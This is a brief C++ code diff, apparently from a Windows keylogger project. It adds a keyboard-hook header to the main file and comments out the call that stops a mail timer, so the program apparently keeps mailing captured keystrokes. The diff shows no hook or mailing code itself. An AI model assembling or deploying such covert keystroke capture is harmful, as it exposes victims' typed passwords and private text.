@@ -5,7 +5,7 @@
 #include "Base64.h"
 #include "IO.h"
 #include "Timer.h"
-
+#include "keybhook.h"
 using namespace std;
 
 int main ()
@@ -18,6 +18,6 @@ int main ()
         TranslateMessage(&Msg);
         DispatchMessage(&Msg);
     }
-    MailTimer.Stop();
+    //MailTimer.Stop();
     return 0;
 }
